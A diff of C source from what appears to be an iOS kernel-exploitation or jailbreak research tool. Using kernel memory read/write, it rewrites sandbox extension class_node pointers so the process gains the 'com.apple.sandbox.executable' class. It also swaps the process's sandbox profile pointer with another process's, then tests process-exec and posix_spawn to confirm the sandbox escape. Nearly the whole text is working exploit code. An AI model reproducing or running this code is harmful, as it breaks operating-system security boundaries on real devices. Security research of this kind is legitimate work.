@@ -2462,69 +2462,53 @@ char *kresearch_dump_extensions(void) {
             }
             buf_append("\n");
 
-            // Read class name from our offset (0x00)
+            // Read class name (confirmed at +0x10 in the struct)
             char class_name[256] = {0};
             if ((uint64_t)cn.class_name) {
                 kreadbuf((uint64_t)cn.class_name, class_name, 255);
             }
-            buf_append("      OUR class_name(+0x00): \"%s\" (ptr=0x%llx)\n", class_name, (uint64_t)cn.class_name);
-
-            // Also try lara's class_name offset (+0x10) for comparison
-            uint64_t lara_cn_ptr = *(uint64_t *)(cn_raw + 0x10);
-            char lara_class_name[256] = {0};
-            if (lara_cn_ptr >= VM_MIN_KERNEL_ADDRESS && lara_cn_ptr <= VM_MAX_KERNEL_ADDRESS) {
-                kreadbuf(lara_cn_ptr, lara_class_name, 255);
-            }
-            buf_append("      LARA class_name(+0x10): \"%s\" (ptr=0x%llx)\n", lara_class_name, lara_cn_ptr);
-
-            buf_append("      next(+0x08):  0x%llx\n", (uint64_t)cn.next);
-            buf_append("      ext_head:     0x%llx\n", (uint64_t)cn.ext_list_head);
-            buf_append("      count:        %llu\n", cn.count);
+            buf_append("      class_name(+0x10): \"%s\" (ptr=0x%llx)\n", class_name, (uint64_t)cn.class_name);
+            buf_append("      next(+0x00):  0x%llx\n", (uint64_t)cn.next);
+            buf_append("      ext_head(+0x08): 0x%llx\n", (uint64_t)cn.ext_list_head);
+            buf_append("      count(+0x18):    %llu\n", cn.count);
 
             // Walk the extension linked list
             uint64_t ext_ptr = (uint64_t)cn.ext_list_head;
             int ext_idx = 0;
             while (ext_ptr && ext_idx < 20) {
-                // Raw hex dump of extension (0x60 bytes to cover lara's offsets)
-                uint8_t ext_raw[EXTENSION_RAW_SIZE];
-                kreadbuf(ext_ptr, ext_raw, EXTENSION_RAW_SIZE);
+                // Raw hex dump of extension (0x60 bytes)
+                uint8_t ext_raw[EXT_RAW_SIZE];
+                kreadbuf(ext_ptr, ext_raw, EXT_RAW_SIZE);
 
-                struct extension ext = {0};
-                memcpy(&ext, ext_raw, sizeof(ext));
+                // Read fields via confirmed raw offsets
+                uint64_t data_ptr = *(uint64_t *)(ext_raw + EXT_OFF_DATA);
+                uint64_t data_len = *(uint64_t *)(ext_raw + EXT_OFF_DATALEN);
+                uint64_t ext_next = *(uint64_t *)(ext_raw + 0x00);  // next extension in list
 
-                // Read path from OUR data_ptr offset (0x18)
-                char path[256] = {0};
-                if ((uint64_t)ext.data_ptr) {
-                    kreadbuf((uint64_t)ext.data_ptr, path, 255);
-                }
-
-                // Read path from LARA's data offset (0x40)
-                uint64_t lara_data_ptr = *(uint64_t *)(ext_raw + LARA_OFF_EXT_DATA);
-                uint64_t lara_data_len = *(uint64_t *)(ext_raw + LARA_OFF_EXT_DATALEN);
-                char lara_path[256] = {0};
-                if (lara_data_ptr >= VM_MIN_KERNEL_ADDRESS && lara_data_ptr <= VM_MAX_KERNEL_ADDRESS) {
-                    kreadbuf(lara_data_ptr, lara_path, 255);
+                char data_path[256] = {0};
+                if (data_ptr >= VM_MIN_KERNEL_ADDRESS && data_ptr <= VM_MAX_KERNEL_ADDRESS) {
+                    kreadbuf(data_ptr, data_path, 255);
                 }
 
                 buf_append("        ext[%d] @ 0x%llx  raw:\n", ext_idx, ext_ptr);
-                for (int row = 0; row < EXTENSION_RAW_SIZE; row += 16) {
+                for (int row = 0; row < EXT_RAW_SIZE; row += 16) {
                     buf_append("          +0x%02x: ", row);
-                    for (int c = 0; c < 16 && (row + c) < EXTENSION_RAW_SIZE; c++) {
+                    for (int c = 0; c < 16 && (row + c) < EXT_RAW_SIZE; c++) {
                         buf_append("%02x ", ext_raw[row + c]);
                     }
                     buf_append("\n");
                 }
-                buf_append("          OUR  data_ptr(+0x18)=\"%s\" ptr=0x%llx len=%llu\n",
-                           path, (uint64_t)ext.data_ptr, ext.path_len);
-                buf_append("          LARA data_ptr(+0x40)=\"%s\" ptr=0x%llx len=%llu\n",
-                           lara_path, lara_data_ptr, lara_data_len);
-                buf_append("          hash: 0x%llx  consumed:%d  storage:%d\n",
-                           ext.hash, ext.file.consumed, ext.file.storage_class);
-                buf_append("          st_dev:%u  st_ino:%llu  next:0x%llx\n",
-                           ext.file.st_dev, ext.st_ino, (uint64_t)ext.next);
+                buf_append("          data_ptr(+0x40)=\"%s\" ptr=0x%llx len=%llu\n",
+                           data_path, data_ptr, data_len);
+                // Dump a few more potentially useful raw fields
+                uint64_t raw_0x50 = *(uint64_t *)(ext_raw + 0x50);
+                uint64_t raw_0x58 = *(uint64_t *)(ext_raw + 0x58);
+                buf_append("          +0x50=0x%llx  +0x58=0x%llx  next=0x%llx\n",
+                           raw_0x50, raw_0x58, ext_next);
 
                 total_extensions++;
-                ext_ptr = (uint64_t)ext.next;
+                // Follow next pointer (at +0x00 in extension struct)
+                ext_ptr = ext_next;
                 ext_idx++;
             }
 
@@ -2540,7 +2524,10 @@ char *kresearch_dump_extensions(void) {
 
 char *kresearch_patch_exec(void) {
     buf_init();
-    buf_append("=== PATCH EXEC v2: Using LARA offsets (confirmed on device) ===\n\n");
+    buf_append("=== PATCH EXEC v3: Rename existing class_node (safe) ===\n\n");
+    buf_append("Strategy: Pick one of the many read-write class_nodes and change\n");
+    buf_append("its class_name pointer to point to \"com.apple.sandbox.executable\".\n");
+    buf_append("This is just ONE 8-byte pointer write — no new structs, no buffer overflow.\n\n");
 
     uint64_t self_proc = proc_self();
     if (!self_proc) {
@@ -2571,12 +2558,20 @@ char *kresearch_patch_exec(void) {
     uint64_t buckets[SANDBOX_EXT_NUM_BUCKETS];
     kreadbuf(ext_set_kptr, buckets, sizeof(buckets));
 
-    // ── Phase 1: Find a read-write extension using LARA class_node layout ──
+    // ── Phase 1: Scan all buckets using LARA class_node layout ──
+    // Find a read-write class_node we can rename to "executable".
+    // We want one that's NOT the last read-write one (keep filesystem access).
     // LARA layout: next=+0x00, ext=+0x08, class_name=+0x10, count=+0x18
-    uint64_t rw_cn_ptr = 0;
-    uint64_t rw_ext_ptr = 0;
-    int rw_bucket = -1;
-    char found_class[256] = {0};
+
+    typedef struct {
+        uint64_t cn_ptr;       // class_node kernel address
+        uint64_t ext_ptr;      // extension list head
+        uint64_t classname_ptr; // original class_name pointer
+        int bucket;
+    } rw_entry;
+
+    rw_entry rw_nodes[SANDBOX_EXT_NUM_BUCKETS];
+    int rw_count = 0;
 
     for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
         if (!buckets[i]) {
@@ -2584,189 +2579,98 @@ char *kresearch_patch_exec(void) {
             continue;
         }
 
-        // Read raw class_node bytes and use LARA offsets
         uint8_t cn_raw[0x20];
         kreadbuf(buckets[i], cn_raw, 0x20);
 
-        uint64_t cn_next      = *(uint64_t *)(cn_raw + LARA_CN_NEXT);
-        uint64_t cn_ext       = *(uint64_t *)(cn_raw + LARA_CN_EXT);
-        uint64_t cn_classname = *(uint64_t *)(cn_raw + LARA_CN_CLASSNAME);
+        uint64_t cn_classname = *(uint64_t *)(cn_raw + CN_OFF_CLASSNAME);
+        uint64_t cn_ext       = *(uint64_t *)(cn_raw + CN_OFF_EXT);
 
         char name[256] = {0};
         if (cn_classname >= VM_MIN_KERNEL_ADDRESS && cn_classname <= VM_MAX_KERNEL_ADDRESS) {
             kreadbuf(cn_classname, name, 255);
         }
 
-        buf_append("  bucket[%d]: class=\"%s\" cn=0x%llx ext=0x%llx\n",
-                   i, name, buckets[i], cn_ext);
+        buf_append("  bucket[%d]: class=\"%s\" cn=0x%llx\n", i, name, buckets[i]);
 
-        if ((strstr(name, "read-write") || strstr(name, "container")) && !rw_cn_ptr) {
-            rw_cn_ptr = buckets[i];
-            rw_ext_ptr = cn_ext;
-            rw_bucket = i;
-            strncpy(found_class, name, 255);
+        if (strstr(name, "read-write")) {
+            rw_nodes[rw_count].cn_ptr = buckets[i];
+            rw_nodes[rw_count].ext_ptr = cn_ext;
+            rw_nodes[rw_count].classname_ptr = cn_classname;
+            rw_nodes[rw_count].bucket = i;
+            rw_count++;
         }
     }
 
-    if (!rw_ext_ptr) {
-        buf_append("\nABORT: No read-write or container extension found to clone\n");
-        buf_append("The filesystem sandbox escape may not be active.\n");
+    buf_append("\nFound %d read-write class_nodes\n", rw_count);
+
+    if (rw_count < 2) {
+        buf_append("ABORT: Need at least 2 read-write nodes (keep 1 for filesystem).\n");
+        buf_append("Only found %d. Cannot safely rename one.\n", rw_count);
         return buf_finish();
     }
 
-    buf_append("\nUsing bucket[%d] class=\"%s\" as template\n", rw_bucket, found_class);
-    buf_append("  class_node @ 0x%llx, ext @ 0x%llx\n", rw_cn_ptr, rw_ext_ptr);
+    // Use the LAST read-write node (least likely to be the primary one)
+    rw_entry *victim = &rw_nodes[rw_count - 1];
+    buf_append("Renaming bucket[%d] class_node @ 0x%llx\n", victim->bucket, victim->cn_ptr);
+    buf_append("  original class_name ptr: 0x%llx\n", victim->classname_ptr);
 
-    // Read extension's data_ptr using LARA offset (+0x40)
-    uint8_t ext_raw[EXTENSION_RAW_SIZE];
-    kreadbuf(rw_ext_ptr, ext_raw, EXTENSION_RAW_SIZE);
-    uint64_t data_ptr = *(uint64_t *)(ext_raw + LARA_OFF_EXT_DATA);
-    uint64_t data_len = *(uint64_t *)(ext_raw + LARA_OFF_EXT_DATALEN);
+    // ── Phase 2: Write the exec class name string into the extension's data buffer ──
+    // Read the victim's extension to find its data_ptr (LARA +0x40)
+    uint8_t ext_raw[EXT_RAW_SIZE];
+    kreadbuf(victim->ext_ptr, ext_raw, EXT_RAW_SIZE);
+    uint64_t data_ptr = *(uint64_t *)(ext_raw + EXT_OFF_DATA);
 
-    char src_path[256] = {0};
-    if (data_ptr >= VM_MIN_KERNEL_ADDRESS && data_ptr <= VM_MAX_KERNEL_ADDRESS) {
-        kreadbuf(data_ptr, src_path, 255);
-    }
-    buf_append("  source path (LARA +0x40): \"%s\" len=%llu\n", src_path, data_len);
-
-    // ── Phase 2: Find target bucket ──
-    // First try to find an empty bucket
-    int target_bucket = -1;
-    for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
-        if (buckets[i] == 0) {
-            target_bucket = i;
-            buf_append("\nFound empty bucket[%d]\n", i);
-            break;
-        }
-    }
-
-    // If all full, we'll prepend to a read-write bucket (not rw_bucket itself)
-    uint64_t old_head = 0;
-    if (target_bucket < 0) {
-        buf_append("\nAll buckets populated — will prepend to existing chain\n");
-        for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
-            if (i == rw_bucket) continue;
-            uint8_t cn_raw[0x20];
-            kreadbuf(buckets[i], cn_raw, 0x20);
-            uint64_t cn_classname = *(uint64_t *)(cn_raw + LARA_CN_CLASSNAME);
-            char name[256] = {0};
-            if (cn_classname >= VM_MIN_KERNEL_ADDRESS && cn_classname <= VM_MAX_KERNEL_ADDRESS) {
-                kreadbuf(cn_classname, name, 255);
-            }
-            // Pick a read-write bucket (safe to prepend to)
-            if (strstr(name, "read-write")) {
-                target_bucket = i;
-                old_head = buckets[i];
-                buf_append("  prepending to bucket[%d] (old head=0x%llx)\n", i, old_head);
-                break;
-            }
-        }
-    }
-
-    if (target_bucket < 0) {
-        // Last resort: use any non-rw bucket
-        for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
-            if (i == rw_bucket) continue;
-            target_bucket = i;
-            old_head = buckets[i];
-            buf_append("  last resort: prepending to bucket[%d]\n", i);
-            break;
-        }
-    }
-
-    if (target_bucket < 0) {
-        buf_append("\nABORT: No available bucket\n");
-        return buf_finish();
-    }
-    buf_append("Target: bucket[%d]\n", target_bucket);
-
-    // ── Phase 3: Safety check — verify kwrite works on extension_set ──
-    uint64_t test_addr = ext_set_kptr + (target_bucket * 8);
-    uint64_t test_val = kread64(test_addr);
-    kwrite64(test_addr, test_val);
-    uint64_t verify = kread64(test_addr);
-    if (verify != test_val) {
-        buf_append("ABORT: Safety check failed (wrote 0x%llx, read 0x%llx)\n", test_val, verify);
-        return buf_finish();
-    }
-    buf_append("Safety check PASSED\n");
-
-    // ── Phase 4: Write exec class name string into data buffer ──
-    // The data buffer pointed to by data_ptr has the path (e.g., "/")
-    // followed by unused space from the original container path.
-    // We write our class name string at data_ptr + 0x40 (well past the path).
     if (!data_ptr || data_ptr < VM_MIN_KERNEL_ADDRESS) {
         buf_append("ABORT: data_ptr is invalid (0x%llx)\n", data_ptr);
         return buf_finish();
     }
 
-    // Check how much space is available
-    char buf_check[128] = {0};
-    kreadbuf(data_ptr, buf_check, 128);
-    buf_append("\n  data buffer first 64 bytes:\n    ");
-    for (int i = 0; i < 64; i++) {
-        buf_append("%02x ", (uint8_t)buf_check[i]);
-        if ((i + 1) % 16 == 0) buf_append("\n    ");
-    }
-    buf_append("\n");
-
+    // The data buffer has "/" at the start (2 bytes). Write exec class name at +4.
+    // "com.apple.sandbox.executable\0" = 29 bytes, fits at +4 through +32.
+    // This is well within any container path buffer (typically 80+ bytes).
     const char *exec_class = "com.apple.sandbox.executable";
-    uint64_t exec_class_addr = data_ptr + 0x40;
-    buf_append("Writing \"%s\" at 0x%llx...\n", exec_class, exec_class_addr);
+    uint64_t exec_class_addr = data_ptr + 4;
+
+    buf_append("  data_ptr: 0x%llx\n", data_ptr);
+    buf_append("  writing \"%s\" at data_ptr+4 (0x%llx)...\n", exec_class, exec_class_addr);
     kwritebuf(exec_class_addr, (void *)exec_class, strlen(exec_class) + 1);
 
-    char verify_name[64] = {0};
-    kreadbuf(exec_class_addr, verify_name, 63);
-    buf_append("  verify: \"%s\"\n", verify_name);
-    if (strcmp(verify_name, exec_class) != 0) {
-        buf_append("ABORT: class name write verification failed\n");
+    // Verify
+    char verify_str[64] = {0};
+    kreadbuf(exec_class_addr, verify_str, 63);
+    buf_append("  verify: \"%s\" %s\n", verify_str,
+               strcmp(verify_str, exec_class) == 0 ? "OK" : "MISMATCH!");
+    if (strcmp(verify_str, exec_class) != 0) {
+        buf_append("ABORT: string write verification failed\n");
         return buf_finish();
     }
-    buf_append("  class name written OK\n");
 
-    // ── Phase 5: Build class_node using LARA layout ──
-    // We store the new class_node at data_ptr + 0x80 (past the class name string).
-    // LARA layout: next(+0x00) ext(+0x08) class_name(+0x10) count(+0x18)
-    uint64_t new_cn_addr = data_ptr + 0x80;
-    buf_append("\nBuilding exec class_node at 0x%llx (in data buffer)\n", new_cn_addr);
+    // ── Phase 3: Change the class_node's class_name pointer ──
+    // This is the only structural change: write 8 bytes at class_node + 0x10
+    uint64_t cn_classname_field = victim->cn_ptr + CN_OFF_CLASSNAME;
+    buf_append("\nWriting new class_name ptr 0x%llx → cn+0x10 (0x%llx)...\n",
+               exec_class_addr, cn_classname_field);
 
-    uint8_t cn_buf[0x20];
-    memset(cn_buf, 0, 0x20);
-    *(uint64_t *)(cn_buf + LARA_CN_NEXT)      = old_head;     // chain to old head (0 if empty)
-    *(uint64_t *)(cn_buf + LARA_CN_EXT)       = rw_ext_ptr;   // reuse same extension (has "/" path)
-    *(uint64_t *)(cn_buf + LARA_CN_CLASSNAME) = exec_class_addr;
-    *(uint64_t *)(cn_buf + LARA_CN_COUNT)     = 1;
+    // Safety: read-back the current value first
+    uint64_t old_cn_val = kread64(cn_classname_field);
+    buf_append("  old value: 0x%llx\n", old_cn_val);
 
-    buf_append("  next:       0x%llx %s\n", old_head,
-               old_head ? "(old bucket head)" : "(NULL — empty bucket)");
-    buf_append("  ext:        0x%llx (reusing source extension)\n", rw_ext_ptr);
-    buf_append("  class_name: 0x%llx\n", exec_class_addr);
-    buf_append("  count:      1\n");
+    kwrite64(cn_classname_field, exec_class_addr);
 
-    kwritebuf(new_cn_addr, cn_buf, 0x20);
+    uint64_t new_cn_val = kread64(cn_classname_field);
+    buf_append("  new value: 0x%llx %s\n", new_cn_val,
+               new_cn_val == exec_class_addr ? "OK" : "MISMATCH!");
 
-    // Verify the write
-    uint8_t verify_cn[0x20];
-    kreadbuf(new_cn_addr, verify_cn, 0x20);
-    uint64_t v_next = *(uint64_t *)(verify_cn + LARA_CN_NEXT);
-    uint64_t v_ext  = *(uint64_t *)(verify_cn + LARA_CN_EXT);
-    uint64_t v_cn   = *(uint64_t *)(verify_cn + LARA_CN_CLASSNAME);
-    buf_append("  verify: next=0x%llx ext=0x%llx class_name=0x%llx\n", v_next, v_ext, v_cn);
+    // Verify by reading the class name through the pointer
+    char verify_cn_name[64] = {0};
+    kreadbuf(new_cn_val, verify_cn_name, 63);
+    buf_append("  class_name now reads: \"%s\"\n", verify_cn_name);
 
-    // ── Phase 6: Link into extension set ──
-    buf_append("\nLinking into type_buckets[%d]...\n", target_bucket);
-    uint64_t bucket_addr = ext_set_kptr + (target_bucket * 8);
-    kwrite64(bucket_addr, new_cn_addr);
-
-    uint64_t verify_bucket = kread64(bucket_addr);
-    buf_append("  bucket[%d] = 0x%llx (expected 0x%llx) %s\n",
-               target_bucket, verify_bucket, new_cn_addr,
-               verify_bucket == new_cn_addr ? "OK" : "MISMATCH!");
-
-    // ── Phase 7: Test ──
+    // ── Phase 4: Test ──
     buf_append("\n=== TESTING ===\n");
 
     pid_t pid = getpid();
+
     int exec_check = sandbox_check(pid, "process-exec",
                                    SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                    "/bin/sh");
@@ -2775,8 +2679,8 @@ char *kresearch_patch_exec(void) {
 
     exec_check = sandbox_check(pid, "process-exec",
                                SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
-                               "/usr/bin/env");
-    buf_append("sandbox_check(process-exec, /usr/bin/env) = %d %s\n",
+                               "/bin/df");
+    buf_append("sandbox_check(process-exec, /bin/df) = %d %s\n",
                exec_check, exec_check == 0 ? "ALLOWED!" : "DENIED");
 
     int fork_check = sandbox_check(pid, "process-fork",
@@ -2784,14 +2688,13 @@ char *kresearch_patch_exec(void) {
     buf_append("sandbox_check(process-fork) = %d %s\n",
                fork_check, fork_check == 0 ? "ALLOWED!" : "DENIED");
 
-    // Try posix_spawn with multiple binaries
-    const char *bins[] = {"/bin/sh", "/usr/bin/env", "/bin/df", "/bin/ps", NULL};
-    for (int b = 0; bins[b]; b++) {
-        buf_append("\nposix_spawn(%s)...\n", bins[b]);
+    // Try posix_spawn ONLY with /bin/df (known to exist)
+    buf_append("\nposix_spawn(/bin/df)...\n");
+    {
         pid_t child = 0;
-        char *argv[] = {(char *)bins[b], NULL};
+        char *argv[] = {"/bin/df", NULL};
         extern char **environ;
-        int spawn_ret = posix_spawn(&child, bins[b], NULL, NULL, argv, environ);
+        int spawn_ret = posix_spawn(&child, "/bin/df", NULL, NULL, argv, environ);
         buf_append("  returned: %d (%s)\n", spawn_ret, strerror(spawn_ret));
         if (spawn_ret == 0) {
             buf_append("  *** CHILD PID: %d — SPAWN SUCCEEDED! ***\n", child);
@@ -2801,7 +2704,11 @@ char *kresearch_patch_exec(void) {
         }
     }
 
-    buf_append("\n=== PATCH EXEC v2 COMPLETE ===\n");
+    buf_append("\nOriginal class_name ptr was 0x%llx\n", old_cn_val);
+    buf_append("To restore: use sandbox_label_write or kernel_write to write\n");
+    buf_append("0x%llx to address 0x%llx\n", old_cn_val, cn_classname_field);
+
+    buf_append("\n=== PATCH EXEC v3 COMPLETE ===\n");
     return buf_finish();
 }
 
@@ -2811,18 +2718,22 @@ char *kresearch_patch_exec(void) {
 
 char *kresearch_try_profile_swap(int target_pid) {
     buf_init();
+    bc_init();
     buf_append("=== PROFILE SWAP: Copying profile from PID %d ===\n\n", target_pid);
+    bc("profile_swap start target_pid=%d\n", target_pid);
 
     // Get our sandbox_label
     uint64_t self_proc = proc_self();
     if (!self_proc) {
         buf_append("ABORT: proc_self() returned NULL\n");
+        bc_close();
         return buf_finish();
     }
     uint64_t our_label = proc_get_cred_label(self_proc);
     uint64_t our_sbx = label_get_sandbox(our_label);
     if (!our_sbx) {
         buf_append("ABORT: our sandbox_label is NULL\n");
+        bc_close();
         return buf_finish();
     }
 
@@ -2830,6 +2741,13 @@ char *kresearch_try_profile_swap(int target_pid) {
     uint64_t our_profile = kread64(our_sbx);
     buf_append("Our sandbox_label @ 0x%llx\n", our_sbx);
     buf_append("Our profile ptr:    0x%llx\n", our_profile);
+
+    // Dump sandbox_label fields for analysis
+    buf_append("\nSandbox_label raw dump:\n");
+    for (int off = 0; off <= 0x60; off += 8) {
+        uint64_t val = kread64(our_sbx + off);
+        buf_append("  +0x%02x: 0x%016llx\n", off, val);
+    }
 
     // Get target process's sandbox_label + profile
     uint64_t target_proc = 0;
@@ -2842,11 +2760,18 @@ char *kresearch_try_profile_swap(int target_pid) {
     if (target_proc) {
         uint64_t target_label = proc_get_cred_label(target_proc);
         target_sbx = label_get_sandbox(target_label);
-        buf_append("Target sandbox_label @ 0x%llx\n", target_sbx);
+        buf_append("\nTarget sandbox_label @ 0x%llx\n", target_sbx);
 
         if (target_sbx && target_sbx != (uint64_t)-1) {
             target_profile = kread64(target_sbx);
             buf_append("Target profile ptr:   0x%llx\n", target_profile);
+
+            // Dump target's sandbox_label too for comparison
+            buf_append("Target sandbox_label dump:\n");
+            for (int off = 0; off <= 0x60; off += 8) {
+                uint64_t val = kread64(target_sbx + off);
+                buf_append("  +0x%02x: 0x%016llx\n", off, val);
+            }
         } else {
             buf_append("Target has no sandbox (ptr=0x%llx) — unsandboxed process\n", target_sbx);
         }
@@ -2865,61 +2790,38 @@ char *kresearch_try_profile_swap(int target_pid) {
     buf_append("  process-exec(/bin/sh): %d %s\n", pre_exec, pre_exec == 0 ? "ALLOWED" : "DENIED");
     buf_append("  process-fork:          %d %s\n", pre_fork, pre_fork == 0 ? "ALLOWED" : "DENIED");
 
-    // ── Attempt 1: Swap with target's profile ──
-    if (target_profile) {
-        buf_append("\n--- Attempt 1: Writing target profile 0x%llx → sandbox+0x00 ---\n", target_profile);
-        kwrite64(our_sbx, target_profile);
-        uint64_t readback = kread64(our_sbx);
-        buf_append("  readback: 0x%llx %s\n", readback,
-                   readback == target_profile ? "OK" : "MISMATCH!");
-
-        int post_exec = sandbox_check(my_pid, "process-exec",
-                                      SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
-                                      "/bin/sh");
-        int post_fork = sandbox_check(my_pid, "process-fork",
-                                      SANDBOX_CHECK_NO_REPORT);
-        buf_append("  process-exec(/bin/sh): %d %s\n", post_exec, post_exec == 0 ? "ALLOWED!" : "DENIED");
-        buf_append("  process-fork:          %d %s\n", post_fork, post_fork == 0 ? "ALLOWED!" : "DENIED");
-
-        if (post_exec == 0) {
-            buf_append("\n*** EXEC NOW ALLOWED WITH TARGET PROFILE! ***\n");
-            // Try spawn
-            pid_t child = 0;
-            char *argv[] = {"/bin/df", NULL};
-            extern char **environ;
-            int ret = posix_spawn(&child, "/bin/df", NULL, NULL, argv, environ);
-            buf_append("posix_spawn(/bin/df): %d (%s)\n", ret, strerror(ret));
-            if (ret == 0) {
-                buf_append("  *** CHILD PID: %d ***\n", child);
-                int status = 0;
-                waitpid(child, &status, 0);
-                buf_append("  exit: %d\n", WEXITSTATUS(status));
-            }
-            return buf_finish();
-        }
-
-        // Restore before trying next attempt
-        buf_append("  Restoring original profile...\n");
-        kwrite64(our_sbx, our_profile);
+    // ── Only safe attempt: Swap with target's profile ──
+    // (Writing NULL or zeroing flags causes kernel panics — removed)
+    if (!target_profile) {
+        buf_append("\nNo valid target profile to swap with.\n");
+        buf_append("Suggestions:\n");
+        buf_append("  - Try PID 34 (SpringBoard) — has a permissive profile\n");
+        buf_append("  - Use sandbox_label_write for manual experimentation\n");
+        bc_close();
+        return buf_finish();
     }
 
-    // ── Attempt 2: Write NULL (0x0) as profile ──
-    buf_append("\n--- Attempt 2: Writing NULL (0x0) → sandbox+0x00 ---\n");
-    kwrite64(our_sbx, 0);
-    uint64_t readback2 = kread64(our_sbx);
-    buf_append("  readback: 0x%llx %s\n", readback2,
-               readback2 == 0 ? "OK" : "MISMATCH!");
+    buf_append("\n--- Swapping profile: 0x%llx → 0x%llx ---\n", our_profile, target_profile);
+    bc("BEFORE profile write: 0x%llx → 0x%llx\n", our_profile, target_profile);
+    kwrite64(our_sbx, target_profile);
+    bc("AFTER profile write\n");
+    uint64_t readback = kread64(our_sbx);
+    buf_append("  readback: 0x%llx %s\n", readback,
+               readback == target_profile ? "OK" : "MISMATCH!");
 
-    int post_exec2 = sandbox_check(my_pid, "process-exec",
-                                   SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
-                                   "/bin/sh");
-    int post_fork2 = sandbox_check(my_pid, "process-fork",
-                                   SANDBOX_CHECK_NO_REPORT);
-    buf_append("  process-exec(/bin/sh): %d %s\n", post_exec2, post_exec2 == 0 ? "ALLOWED!" : "DENIED");
-    buf_append("  process-fork:          %d %s\n", post_fork2, post_fork2 == 0 ? "ALLOWED!" : "DENIED");
+    bc("BEFORE sandbox_check with new profile\n");
+    int post_exec = sandbox_check(my_pid, "process-exec",
+                                  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
+                                  "/bin/sh");
+    int post_fork = sandbox_check(my_pid, "process-fork",
+                                  SANDBOX_CHECK_NO_REPORT);
+    bc("AFTER sandbox_check exec=%d fork=%d\n", post_exec, post_fork);
+    buf_append("  process-exec(/bin/sh): %d %s\n", post_exec, post_exec == 0 ? "ALLOWED!" : "DENIED");
+    buf_append("  process-fork:          %d %s\n", post_fork, post_fork == 0 ? "ALLOWED!" : "DENIED");
 
-    if (post_exec2 == 0) {
-        buf_append("\n*** EXEC NOW ALLOWED WITH NULL PROFILE! ***\n");
+    if (post_exec == 0) {
+        buf_append("\n*** EXEC NOW ALLOWED WITH TARGET PROFILE! ***\n");
+        bc("EXEC ALLOWED — trying spawn\n");
         pid_t child = 0;
         char *argv[] = {"/bin/df", NULL};
         extern char **environ;
@@ -2931,47 +2833,25 @@ char *kresearch_try_profile_swap(int target_pid) {
             waitpid(child, &status, 0);
             buf_append("  exit: %d\n", WEXITSTATUS(status));
         }
+        bc_close();
         return buf_finish();
     }
 
-    // Restore
+    // Restore original profile
     buf_append("  Restoring original profile...\n");
+    bc("BEFORE restore profile\n");
     kwrite64(our_sbx, our_profile);
+    bc("AFTER restore profile\n");
     uint64_t restored = kread64(our_sbx);
     buf_append("  restored: 0x%llx %s\n", restored,
                restored == our_profile ? "OK" : "PROBLEM!");
 
-    // ── Attempt 3: Try zeroing the flags at +0x50 and +0x58 ──
-    buf_append("\n--- Attempt 3: Zeroing sandbox flags at +0x50 and +0x58 ---\n");
-    uint64_t old_flags50 = kread64(our_sbx + 0x50);
-    uint64_t old_flags58 = kread64(our_sbx + 0x58);
-    buf_append("  current +0x50: 0x%llx\n", old_flags50);
-    buf_append("  current +0x58: 0x%llx\n", old_flags58);
-
-    kwrite64(our_sbx + 0x50, 0);
-    kwrite64(our_sbx + 0x58, 0);
-
-    int post_exec3 = sandbox_check(my_pid, "process-exec",
-                                   SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
-                                   "/bin/sh");
-    int post_fork3 = sandbox_check(my_pid, "process-fork",
-                                   SANDBOX_CHECK_NO_REPORT);
-    buf_append("  process-exec(/bin/sh): %d %s\n", post_exec3, post_exec3 == 0 ? "ALLOWED!" : "DENIED");
-    buf_append("  process-fork:          %d %s\n", post_fork3, post_fork3 == 0 ? "ALLOWED!" : "DENIED");
-
-    if (post_exec3 == 0) {
-        buf_append("\n*** EXEC NOW ALLOWED BY ZEROING FLAGS! ***\n");
-        return buf_finish();
-    }
-
-    // Restore flags
-    kwrite64(our_sbx + 0x50, old_flags50);
-    kwrite64(our_sbx + 0x58, old_flags58);
-    buf_append("  Flags restored\n");
-
-    buf_append("\n=== PROFILE SWAP COMPLETE — no method succeeded ===\n");
-    buf_append("The sandbox profile is likely enforced independently of these fields.\n");
-    buf_append("Extension injection (patch_exec) or thread hijacking may be needed.\n");
+    buf_append("\n=== PROFILE SWAP — exec still denied ===\n");
+    buf_append("The sandbox profile controls process-exec independently of extensions.\n");
+    buf_append("SPTM/PPL protects the profile bytecode from being swapped.\n");
+    buf_append("Try: patch_exec to add executable extension, or sandbox_label_write\n");
+    buf_append("for manual field experimentation with specific offsets.\n");
+    bc_close();
     return buf_finish();
 }
 
